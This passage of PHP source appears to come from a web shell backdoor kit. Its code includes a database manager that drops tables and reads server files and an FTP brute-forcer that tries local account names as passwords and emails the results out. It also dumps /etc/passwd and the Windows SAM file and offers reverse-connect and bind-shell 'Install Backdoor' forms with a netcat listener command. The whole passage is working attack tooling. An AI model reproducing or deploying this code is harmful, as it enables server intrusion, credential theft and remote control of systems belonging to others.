          echo "<input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "><b>Insert as new row</b>";
          if (!empty($sql_tbl_insert_q)) {echo " or <input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked><b>Save</b>"; echo "<input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\">";}
          echo "<br><br><input type=\"submit\" value=\"Confirm\"></form>";
        }
      }
      if ($sql_tbl_act == "browse") {
        $sql_tbl_ls = abs($sql_tbl_ls);
        $sql_tbl_le = abs($sql_tbl_le);
        echo "<hr size=\"1\" noshade>";
        echo "<img src=\"".$surl."act=img&img=multipage\" height=\"12\" width=\"10\" alt=\"Pages\">&nbsp;";
        $b = 0;
        for($i=0;$i<$numpages;$i++) {
          if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\"><u>";}
          echo $i;
          if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "</u></a>";}
          if (($i/30 == round($i/30)) and ($i > 0)) {echo "<br>";}
          else {echo "&nbsp;";}
        }
        if ($i == 0) {echo "empty";}
        echo "<form method=\"GET\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"><b>From:</b>&nbsp;<input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\">&nbsp;<input type=\"submit\" value=\"View\"></form>";
        echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1>";
        echo "<tr>";
        echo "<td><input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"></td>";
        for ($i=0;$i<mysql_num_fields($result);$i++) {
          $v = mysql_field_name($result,$i);
          if ($e[0] == "a") {$s = "d"; $m = "asc";}
          else {$s = "a"; $m = "desc";}
          echo "<td>";
          if (empty($e[0])) {$e[0] = "a";}
          if ($e[1] != $v) {echo "<a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\"><b>".$v."</b></a>";}
          else {echo "<b>".$v."</b><a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\"><img src=\"".$surl."act=img&img=sort_".$m."\" height=\"9\" width=\"14\" alt=\"".$m."\"></a>";}
          echo "</td>";
        }
      echo "<td><font color=\"green\"><b>Action</b></font></td>";
      echo "</tr>";
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
       echo "<tr>";
       $w = "";
       $i = 0;
       foreach ($row as $k=>$v) {$name = mysql_field_name($result,$i); $w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;}
       if (count($row) > 0) {$w = substr($w,0,strlen($w)-3);}
       echo "<td><input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"></td>";
       $i = 0;
       foreach ($row as $k=>$v)
       {
        $v = htmlspecialchars($v);
        if ($v == "") {$v = "<font color=\"green\">NULL</font>";}
        echo "<td>".$v."</td>";
        $i++;
       }
       echo "<td>";
       echo "<a href=\"".$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Delete\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;";
       echo "<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\"><img src=\"".$surl."act=img&img=change\" alt=\"Edit\" height=\"14\" width=\"14\" border=\"0\"></a>&nbsp;";
       echo "</td>";
       echo "</tr>";
      }
      mysql_free_result($result);
      echo "</table><hr size=\"1\" noshade><p align=\"left\"><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_act\">";
      echo "<option value=\"\">With selected:</option>";
      echo "<option value=\"deleterow\">Delete</option>";
      echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>";
     }
    }
    else {
     $result = mysql_query("SHOW TABLE STATUS", $sql_sock);
     if (!$result) {echo mysql_smarterror();}
     else
     {
      echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td><input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"></td><td><center><b>Table</b></center></td><td><b>Rows</b></td><td><b>Type</b></td><td><b>Created</b></td><td><b>Modified</b></td><td><b>Size</b></td><td><b>Action</b></td></tr>";
      $i = 0;
      $tsize = $trows = 0;
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
      {
       $tsize += $row["Data_length"];
       $trows += $row["Rows"];
       $size = view_size($row["Data_length"]);
       echo "<tr>";
       echo "<td><input type=\"checkbox\" name=\"boxtbl[]\" value=\"".$row["Name"]."\"></td>";
       echo "<td>&nbsp;<a href=\"".$sql_surl."sql_tbl=".urlencode($row["Name"])."\"><b>".$row["Name"]."</b></a>&nbsp;</td>";
       echo "<td>".$row["Rows"]."</td>";
       echo "<td>".$row["Type"]."</td>";
       echo "<td>".$row["Create_time"]."</td>";
       echo "<td>".$row["Update_time"]."</td>";
       echo "<td>".$size."</td>";
       echo "<td>&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DELETE FROM `".$row["Name"]."`")."\"><img src=\"".$surl."act=img&img=sql_button_empty\" alt=\"Empty\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row["Name"]."`")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Drop\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".$row["Name"]."\"><img src=\"".$surl."act=img&img=sql_button_insert\" alt=\"Insert\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;</td>";
       echo "</tr>";
       $i++;
      }
      echo "<tr bgcolor=\"000000\">";
      echo "<td><center><b>+</b></center></td>";
      echo "<td><center><b>".$i." table(s)</b></center></td>";
      echo "<td><b>".$trows."</b></td>";
      echo "<td>".$row[1]."</td>";
      echo "<td>".$row[10]."</td>";
      echo "<td>".$row[11]."</td>";
      echo "<td><b>".view_size($tsize)."</b></td>";
      echo "<td></td>";
      echo "</tr>";
      echo "</table><hr size=\"1\" noshade><p align=\"right\"><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_act\">";
      echo "<option value=\"\">With selected:</option>";
      echo "<option value=\"tbldrop\">Drop</option>";
      echo "<option value=\"tblempty\">Empty</option>";
      echo "<option value=\"tbldump\">Dump</option>";
      echo "<option value=\"tblcheck\">Check table</option>";
      echo "<option value=\"tbloptimize\">Optimize table</option>";
      echo "<option value=\"tblrepair\">Repair table</option>";
      echo "<option value=\"tblanalyze\">Analyze table</option>";
      echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>";
      mysql_free_result($result);
     }
    }
   }
   }
  }
  else {
   $acts = array("","newdb","serverstatus","servervars","processes","getfile");
   if (in_array($sql_act,$acts)) {?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newdb"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newdb" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>View File:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="getfile"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>">&nbsp;<input type="submit" value="Get"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php }
   if (!empty($sql_act)) {
    echo "<hr size=\"1\" noshade>";
    if ($sql_act == "newdb") {
     echo "<b>";
     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";}
     else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
    }
    if ($sql_act == "serverstatus") {
     $result = mysql_query("SHOW STATUS", $sql_sock);
     echo "<center><b>Server-status variables:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=0 bgcolor=#000000 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
     echo "</table></center>";
     mysql_free_result($result);
    }
    if ($sql_act == "servervars") {
     $result = mysql_query("SHOW VARIABLES", $sql_sock);
     echo "<center><b>Server variables:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=0 bgcolor=#000000 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
     echo "</table>";
     mysql_free_result($result);
    }
    if ($sql_act == "processes") {
     if (!empty($kill)) {
       $query = "KILL ".$kill.";";
       $result = mysql_query($query, $sql_sock);
       echo "<b>Process #".$kill." was killed.</b>";
     }
     $result = mysql_query("SHOW PROCESSLIST", $sql_sock);
     echo "<center><b>Processes:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=2 borderColorLight=#333333 border=1><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td><td><b>Action</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"".$sql_surl."sql_act=processes&kill=".$row[0]."\"><u>Kill</u></a></td></tr>";}
     echo "</table>";
     mysql_free_result($result);
    }
    if ($sql_act == "getfile")
    {
     $tmpdb = $sql_login."_tmpdb";
     $select = mysql_select_db($tmpdb);
     if (!$select) {mysql_create_db($tmpdb); $select = mysql_select_db($tmpdb); $created = !!$select;}
     if ($select)
     {
      $created = FALSE;
      mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
      mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");
      $result = mysql_query("SELECT * FROM tmp_file;");
      if (!$result) {echo "<b>Error in reading file (permision denied)!</b>";}
      else
      {
       for ($i=0;$i<mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}
       $f = "";
       while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {$f .= join ("\r\n",$row);}
       if (empty($f)) {echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b><br>";}
       else {echo "<b>File \"".$sql_getfile."\":</b><br>".nl2br(htmlspecialchars($f))."<br>";}
       mysql_free_result($result);
       mysql_query("DROP TABLE tmp_file;");
      }
     }
     mysql_drop_db($tmpdb);
    }
   }
  }
}
echo "</td></tr></table>\n";
if ($sql_sock) {
  $affected = @mysql_affected_rows($sql_sock);
  if ((!is_numeric($affected)) or ($affected < 0)){$affected = 0;}
  echo "<tr><td><center><b>Affected rows : ".$affected."</center></td></tr>";
}
echo "</table>\n";
}
//End of SQL Manager
if ($act == "ftpquickbrute") {
echo "<center><table><tr><td class=barheader colspan=2>";
echo ".: Ftp Quick Brute :.</td></tr>";
echo "<tr><td>";
if ($win) { echo "Can't run on Windows!"; }
else {
  function tpftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) {
    if ($fqb_onlywithsh) {$TRUE = (!in_array($sh,array("/bin/FALSE","/sbin/nologin")));}
    else {$TRUE = TRUE;}
    if ($TRUE) {
      $sock = @ftp_connect($host,$port,$timeout);
      if (@ftp_login($sock,$login,$pass)) {
        echo "<a href=\"ftp://".$login.":".$pass."@".$host."\" target=\"_blank\"><b>Connected to ".$host." with login \"".$login."\" and password \"".$pass."\"</b></a>.<br>";
        ob_flush();
        return TRUE;
      }
    }
  }
  if (!empty($submit)) {
    if (!is_numeric($fqb_lenght)) {$fqb_lenght = $nixpwdperpage;}
    $fp = fopen("/etc/passwd","r");
    if (!$fp) {echo "Can't get /etc/passwd for password-list.";}
    else {
      if ($fqb_logging) {
        if ($fqb_logfile) {$fqb_logfp = fopen($fqb_logfile,"w");}
        else {$fqb_logfp = FALSE;}
        $fqb_log = "FTP Quick Brute (".$sh_name.") started at ".date("d.m.Y H:i:s")."\r\n\r\n";
        if ($fqb_logfile) {fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
      }
      ob_flush();
      $i = $success = 0;
      $ftpquick_st = getmicrotime();
      while(!feof($fp)) {
        $str = explode(":",fgets($fp,2048));
        if (tpftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh)) {
          echo "<b>Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\"</b><br>";
          $fqb_log .= "Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\", at ".date("d.m.Y H:i:s")."\r\n";
          if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
          $success++;
          ob_flush();
        }
        if ($i > $fqb_lenght) {break;}
        $i++;
      }
      if ($success == 0) {echo "No success. connections!"; $fqb_log .= "No success. connections!\r\n";}
      $ftpquick_t = round(getmicrotime()-$ftpquick_st,4);
      echo "<hr size=\"1\" noshade><b>Done!</b><br>Total time (secs.): ".$ftpquick_t."<br>Total connections: ".$i."<br>Success.: <font color=green><b>".$success."</b></font><br>Unsuccess.:".($i-$success)."</b><br>Connects per second: ".round($i/$ftpquick_t,2)."<br>";
      $fqb_log .= "\r\n------------------------------------------\r\nDone!\r\nTotal time (secs.): ".$ftpquick_t."\r\nTotal connections: ".$i."\r\nSuccess.: ".$success."\r\nUnsuccess.:".($i-$success)."\r\nConnects per second: ".round($i/$ftpquick_t,2)."\r\n";
      if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
      if ($fqb_logemail) {@mail($fqb_logemail,"".$sh_name." report",$fqb_log);}
      fclose($fqb_logfp);
    }
  }
  else {
    $logfile = $tmpdir_logs."tpsh_ftpquickbrute_".date("d.m.Y_H_i_s").".log";
    $logfile = str_replace("//",DIRECTORY_SEPARATOR,$logfile);
    echo "<form action=\"".$surl."\"><input type=hidden name=act value=\"ftpquickbrute\">".
         "Read first:</td><td><input type=text name=\"fqb_lenght\" value=\"".$nixpwdperpage."\"></td></tr>".
         "<tr><td></td><td><input type=\"checkbox\" name=\"fqb_onlywithsh\" value=\"1\"> Users only with shell</td></tr>".
         "<tr><td></td><td><input type=\"checkbox\" name=\"fqb_logging\" value=\"1\" checked>Logging</td></tr>".
         "<tr><td>Logging to file:</td><td><input type=\"text\" name=\"fqb_logfile\" value=\"".$logfile."\" size=\"".(strlen($logfile)+2*(strlen($logfile)/10))."\"></td></tr>".
         "<tr><td>Logging to e-mail:</td><td><input type=\"text\" name=\"fqb_logemail\" value=\"".$log_email."\" size=\"".(strlen($logemail)+2*(strlen($logemail)/10))."\"></td></tr>".
         "<tr><td colspan=2><input type=submit name=submit value=\"Brute\"></form>";
  }
  echo "</td></tr></table></center>";
}
}
if ($act == "d") {
  if (!is_dir($d)) { echo "<center><b>$d is a not a Directory!</b></center>"; }
  else {
    echo "<b>Directory information:</b><table border=0 cellspacing=1 cellpadding=2>";
    if (!$win) {
      echo "<tr><td><b>Owner/Group</b></td><td> ";
      $ow = posix_getpwuid(fileowner($d));
      $gr = posix_getgrgid(filegroup($d));
      $row[] = ($ow["name"]?$ow["name"]:fileowner($d))."/".($gr["name"]?$gr["name"]:filegroup($d));
    }
    echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&d=".urlencode($d)."\"><b>".view_perms_color($d)."</b></a><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d))."</td></tr></table>";
  }
}
if ($act == "phpinfo") {@ob_clean(); phpinfo(); tpshexit();}
if ($act == "security") {
  echo "<div class=barheader>.: Server Security Information :.</div>\n".
       "<table>\n".
       "<tr><td>Open Base Dir</td><td>".$hopenbasedir."</td></tr>\n";
  echo "<td>Password File</td><td>";
  if (!$win) {
    if ($nixpasswd) {
      if ($nixpasswd == 1) {$nixpasswd = 0;}
      echo "*nix /etc/passwd:<br>";
      if (!is_numeric($nixpwd_s)) {$nixpwd_s = 0;}
      if (!is_numeric($nixpwd_e)) {$nixpwd_e = $nixpwdperpage;}
      echo "<form action=\"".$surl."\"><input type=hidden name=act value=\"security\"><input type=hidden name=\"nixpasswd\" value=\"1\"><b>From:</b>&nbsp;<input type=\"text=\" name=\"nixpwd_s\" value=\"".$nixpwd_s."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"nixpwd_e\" value=\"".$nixpwd_e."\">&nbsp;<input type=submit value=\"View\"></form><br>";
      $i = $nixpwd_s;
      while ($i < $nixpwd_e) {
        $uid = posix_getpwuid($i);
        if ($uid) {
          $uid["dir"] = "<a href=\"".$surl."act=ls&d=".urlencode($uid["dir"])."\">".$uid["dir"]."</a>";
          echo join(":",$uid)."<br>";
        }
        $i++;
      }
    }
    else {echo "<a href=\"".$surl."act=security&nixpasswd=1&d=".$ud."\"><b>Download /etc/passwd</b></a>";}
  }
  else {
    $v = $_SERVER["WINDIR"]."\repair\sam";
    if (!file_get_contents($v)) { echo "<a href=\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><b>Download password file</b></a>"; }
  }
  echo "</td></tr>\n";
  echo "<tr><td>Config Files</td><td>\n";
  if (!$win) {
    $v = array(
        array("User Domains","/etc/userdomains"),
        array("Cpanel Config","/var/cpanel/accounting.log"),
        array("Apache Config","/usr/local/apache/conf/httpd.conf"),
        array("Apache Config","/etc/httpd.conf"),
        array("Syslog Config","/etc/syslog.conf"),
        array("Message of The Day","/etc/motd"),
        array("Hosts","/etc/hosts")
    );
    $sep = "/";
  }
  else {
    $windir = $_SERVER["WINDIR"];
    $etcdir = $windir . "\system32\drivers\etc\\";
    $v = array(
        array("Hosts",$etcdir."hosts"),
        array("Local Network Map",$etcdir."networks"),
        array("LM Hosts",$etcdir."lmhosts.sam"),
    );
    $sep = "\\";
  }
  foreach ($v as $sec_arr) {
    $sec_f = substr(strrchr($sec_arr[1], $sep), 1);
    $sec_d = rtrim($sec_arr[1],$sec_f);
    $sec_full = $sec_d.$sec_f;
    $sec_d = rtrim($sec_d,$sep);
    if (file_get_contents($sec_full)) {
      echo " [ <a href=\"".$surl."act=f&f=$sec_f&d=".urlencode($sec_d)."&ft=txt\"><b>".$sec_arr[0]."</b></a> ] \n";
    }
  }
  echo "</td></tr>";

  function displaysecinfo($name,$value) {
    if (!empty($value)) {
      echo "<tr><td>".$name."</td><td><pre>".wordwrap($value,100)."</pre></td></tr>\n";
    }
  }
  if (!$win) {
    displaysecinfo("OS Version",tpexec("cat /proc/version"));
    displaysecinfo("Kernel Version",tpexec("sysctl -a | grep version"));
    displaysecinfo("Distrib Name",tpexec("cat /etc/issue.net"));
    displaysecinfo("Distrib Name (2)",tpexec("cat /etc/*-realise"));
    displaysecinfo("CPU Info",tpexec("cat /proc/cpuinfo"));
    displaysecinfo("RAM",tpexec("free -m"));
    displaysecinfo("HDD Space",tpexec("df -h"));
    displaysecinfo("List of Attributes",tpexec("lsattr -a"));
    displaysecinfo("Mount Options",tpexec("cat /etc/fstab"));
    displaysecinfo("lynx installed?",tpexec("which lynx"));
    displaysecinfo("links installed?",tpexec("which links"));
    displaysecinfo("GET installed?",tpexec("which GET"));
    displaysecinfo("Where is Apache?",tpexec("whereis apache"));
    displaysecinfo("Where is perl?",tpexec("whereis perl"));
    displaysecinfo("Locate proftpd.conf",tpexec("locate proftpd.conf"));
    displaysecinfo("Locate httpd.conf",tpexec("locate httpd.conf"));
    displaysecinfo("Locate my.conf",tpexec("locate my.conf"));
    displaysecinfo("Locate psybnc.conf",tpexec("locate psybnc.conf"));
  }
  else {
    displaysecinfo("OS Version",tpexec("ver"));
    displaysecinfo("Account Settings",tpexec("net accounts"));
    displaysecinfo("User Accounts",tpexec("net user"));
  }
  echo "</table>\n";
}
if ($act == "mkfile") {
  if ($mkfile != $d) {
    if ($overwrite == 0) {
      if (file_exists($mkfile)) { echo "<b>FILE EXIST:</b> $overwrite ".htmlspecialchars($mkfile); }
    }
    else {
      if (!fopen($mkfile,"w")) { echo "<b>ACCESS DENIED:</b> ".htmlspecialchars($mkfile); }
      else { $act = "f"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} $f = basename($mkfile); }
    }
  }
  else { echo "<div class=fxerrmsg>Enter filename!</div>\r\n"; }
}
if ($act == "encoder") {
echo "<script language=\"javascript\">function set_encoder_input(text) {document.forms.encoder.input.value = text;}</script>".
     "<form name=\"encoder\" action=\"".$surl."\" method=POST>".
     "<input type=hidden name=act value=encoder>".
     "<center><table class=contents>".
     "<tr><td colspan=4 class=barheader>.: Encoder :.</td>".
     "<tr><td colspan=2>Input:</td><td><textarea name=\"encoder_input\" id=\"input\" cols=70 rows=5>".@htmlspecialchars($encoder_input)."</textarea><br>".
     "<input type=submit value=\"calculate\"></td></tr>".
     "<tr><td rowspan=4>Hashes:</td>";
foreach(array("md5","crypt","sha1","crc32") as $v) {
  echo "<td>".$v.":</td><td><input type=text size=50 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$v($encoder_input)."\" readonly></td></tr><tr>";
}
echo "</tr>".
     "<tr><td rowspan=2>Url:</td>".
     "<td>urlencode:</td><td><input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".urlencode($encoder_input)."\" readonly></td></tr>".
     "<tr><td>urldecode:</td><td><input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".htmlspecialchars(urldecode($encoder_input))."\" readonly></td></tr>".
     "<tr><td rowspan=2>Base64:</td>".
     "<td>base64_encode:</td><td><input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".base64_encode($encoder_input)."\" readonly></td></tr>".
     "<tr><td>base64_decode:</td><td>";
if (base64_encode(base64_decode($encoder_input)) != $encoder_input) {echo "<input type=text size=35 value=\"Failed!\" disabled readonly>";}
else {
  $debase64 = base64_decode($encoder_input);
  $debase64 = str_replace("\0","[0]",$debase64);
  $a = explode("\r\n",$debase64);
  $rows = count($a);
  $debase64 = htmlspecialchars($debase64);
  if ($rows == 1) { echo "<input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$debase64."\" id=\"debase64\" readonly>"; }
  else { $rows++; echo "<textarea cols=\"40\" rows=\"".$rows."\" onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" id=\"debase64\" readonly>".$debase64."</textarea>"; }
  echo "&nbsp;<a href=\"#\" onclick=\"set_encoder_input(document.forms.encoder.debase64.value)\">[Send to input]</a>";
}
echo "</td></tr>".
     "<tr><td>Base convertations:</td><td>dec2hex</td><td><input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"";
$c = strlen($encoder_input);
for($i=0;$i<$c;$i++) {
  $hex = dechex(ord($encoder_input[$i]));
  if ($encoder_input[$i] == "&") {echo $encoder_input[$i];}
  elseif ($encoder_input[$i] != "\\") {echo "%".$hex;}
}
echo "\" readonly></td></tr></table></center></form>";
}
if ($act == "fsbuff") {
  $arr_copy = $sess_data["copy"];
  $arr_cut = $sess_data["cut"];
  $arr = array_merge($arr_copy,$arr_cut);
  if (count($arr) == 0) {echo "<h2><center>Buffer is empty!</center></h2>";}
  else {
    $fx_infohead = "File-System Buffer";
    $ls_arr = $arr;
    $disp_fullpath = TRUE;
    $act = "ls";
  }
}
if ($act == "selfremove") {
  if (($submit == $rndcode) and ($submit != "")) {
    if (unlink(__FILE__)) { @ob_clean(); echo "Thanks for using ".$sh_name."!"; tpshexit(); }
    else { echo "<center><b>Can't delete ".__FILE__."!</b></center>"; }
  }
  else {
    if (!empty($rndcode)) {echo "<b>Error: incorrect confirmation!</b>";}
    $rnd = rand(0,9).rand(0,9).rand(0,9);
    echo "<form action=\"".$surl."\">\n".
         "<input type=hidden name=act value=selfremove>".
         "<input type=hidden name=rndcode value=\"".$rnd."\">".
         "<b>Kill-shell: ".__FILE__." <br>".
         "<b>Are you sure? For confirmation, enter \"".$rnd."\"</b>:&nbsp;<input type=text name=submit>&nbsp;<input type=submit value=\"YES\">\n".
         "</form>\n";
  }
}
if ($act == "update") {
  $ret = tpsh_getupdate(!!$confirmupdate);
  echo "<b>".$ret."</b>";
  if (stristr($ret,"new version")) {
    echo "<br><br><input type=button onclick=\"location.href='".$surl."act=update&confirmupdate=1';\" value=\"Update now\">";
  }
}

if ($act == 'backc')
{
 $ip = $_SERVER["REMOTE_ADDR"];
 $msg = $_POST['backcconnmsg'];
 $emsg = $_POST['backcconnmsge'];
 echo('<center><b>Back-Connection:</b></br></br><form name=form method=POST>Host:<input type=text name=backconnectip size=15 value='.$ip.'> Port: <input type=text name=backconnectport size=15 value=5992> Use: <select size=1 name=use><option value=Perl>Perl</option><option value=C>C</option></select> <input type=submit name=submit value=Connect></form>First, run NetCat on your computer using \'<b>nc -l -n -v -p '.$bc_port.'</b>\'.  Then, click "Connect" once the port is listening.</center>');
 echo $msg;
 echo $emsg;
}


if ($act == 'backd'){
$msg = $_POST['backcconnmsg'];
$emsg = $_POST['backcconnmsge'];
echo("<center><b>Bind Shell Backdoor:</b></br></br><form name=form method=POST>
Bind Port: <input type='text' name='backconnectport' value='5992'>
<input type='hidden' name='use' value='shbd'>
<input type='submit' value='Install Backdoor'></form>");
echo("$msg");
echo("$emsg");
echo("</center>");
} 
if ($act == "mler") {
  if (!empty($submit)){
    $headers = 'To: '.$dest_email."\r\n";
    $headers .= 'From: '.$sender_name.' '.$sender_email."\r\n";
    if (mail($suppmail,$sender_subj,$sender_body,$header)) {
      echo "<center><b>Email sent!</b></center>";
    }
    else { echo "<center><b>Can't send email!</b></center>"; }
  }
  else {
    echo "<form action=\"".$surl."\" method=POST>".
         "<input type=hidden name=act value=mler>".
         "<table class=contents><tr><td class=barheader colspan=2>".
         "[ Mailer ]</td></tr>".
         "<tr><td>Your name:</td><td><input type=\"text\" name=\"sender_name\" value=\"".htmlspecialchars($sender_name)."\"></td</tr>".
         "<tr><td>Your e-mail:</td><td><input type=\"text\" name=\"sender_email\" value=\"".htmlspecialchars($sender_email)."\"></td></tr>".
         "<tr><td>To:</td><td><input type=\"text\" name=\"dest_email\" value=\"".htmlspecialchars($dest_email)."\"></td></tr>".
         "<tr><td>Subject:</td><td><input size=70 type=\"text\" name=\"sender_subj\" value=\"".htmlspecialchars($sender_subj)."\"></td></tr>".
